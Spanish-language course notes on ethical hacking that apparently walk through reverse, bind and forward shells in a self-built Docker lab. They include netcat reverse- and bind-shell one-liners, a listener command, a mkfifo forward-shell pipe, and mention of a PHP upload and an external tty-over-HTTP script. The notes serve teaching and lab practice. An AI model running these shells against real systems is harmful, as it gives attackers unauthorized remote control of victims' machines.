# Reverse-shell-bind-shell-forward-shell
Estos son apuntes del curso de savit4ar a introducción al hacking ético

![[Explicaciion grafica sobre reverse shell.png]]
## PRACTICA 

**Creamos un archivo Dockerfile y le colocamos lo siguiente:**

```bash
# Usa la imagen base de Ubuntu
FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive

# Actualiza los repositorios e instala las herramientas
RUN apt-get update && apt-get install -y nano net-tools wget iptables apache2 php

# Exponer el puerto 80
EXPOSE 80
```


Configurar nuestro DockerFile

```bash
sudo docker build -t reverse_shell .
sudo docker run -dit -p 80:80 --cap-add=NET_ADMIN --name Mycontainer reverse_shell
sudo docker exec -it Mycontainer /bin/bash
```

Para la reverse shell solo necesitamos ejecutar una bash con nc (netcat) para que luego en nuestro equipo me ponga en escucha ya que en la reverse shell la maquina victima se conecta a mi maquina

```bash 
ncat -e /bin/bash <MyIP> <puerto>
```
    

en mi maquina se coloca lo siguiente 
``` bash
nc -nlvp 443 
```

Ahora para la bind shell seria en la maquina victima tendria que poner 
que estoy en escucha ofreciendo una bash 
```bash
ncat -nlvp 443 -e /bin/bash
```

y en mi maquina me conecto a la ip de la maquina victima que esta ofreciendo 
la bash seria:

``` bash
nc <ip_victima>
```


Supongamos que hemos subido nuestro archivo php a la pagina y que por medio de ese archivo yo mandare un bash en teoria me deberia dejar, ahora probemos unos parametros de iptables para que no permita ninguna conexión de entrada, mas que el puerto que especificamos para eso he hecho un script en bash lo pueden descargar en mi github [Mi repositorio de GitHub](https://github.com/JJoosh/iptablesauto.git).
Una vez ya configurado intentamos y vemos que no nos deja es aquí donde entra las forward shell donde jugamos con mkfifo, que crea un archivo FIFO (named pipe)  que se utiliza como una especie de “consola simulada” interactiva a través de la cual  el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa  el atacante redirige el tráfico a través del archivo FIFO, lo que permite la comunicación bidireccional con la máquina remota. 

El Hacker savit4r nos ha facilitado todo esto que les  menciono ha hecho un script que automatice esto

[Repositorio de savit4r](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py)

Pero entendamos un poco como funciona para ello coloquemos este comando en nuestra terminal 

``` bash
 mkfifo input; tail -f input | /bin/bash 2>&1 > output
```

1. **mkfifo input:** Este comando crea un archivo especial conocido como FIFO (First In, First Out) llamado "input" en el directorio actual. Un FIFO es una tubería sin nombre que permite la comunicación entre procesos.
2. **tail -f input: **Este comando inicia el seguimiento del archivo "input" recién creado utilizando el comando tail. La opción -f significa "seguimiento continuo", lo que hace que tail permanezca en ejecución y muestre las nuevas líneas agregadas al archivo en tiempo real.
3. **|**: Este símbolo se utiliza para redireccionar la salida estándar de un comando hacia la entrada estándar de otro comando. En este caso, está redirigiendo la salida del comando tail al siguiente comando.
4. **/bin/bash 2>&1 > output**: Este comando inicia una nueva instancia de la shell Bash. Aquí, 2>&1 redirige la salida de error estándar (stderr) al mismo lugar que la salida estándar (stdout). Luego, > redirige la salida estándar de la shell Bash al archivo llamado "output".

Entonces, en resumen, el comando crea un FIFO llamado "input", luego inicia un proceso que lee continuamente de ese FIFO (tail -f input), y las líneas leídas son enviadas a una instancia de la shell Bash que está ejecutándose. Cualquier salida (tanto estándar como de error) generada por la shell Bash se redirige al archivo "output". Esto puede ser utilizado para capturar la salida de comandos ejecutados en la shell Bash en tiempo real.

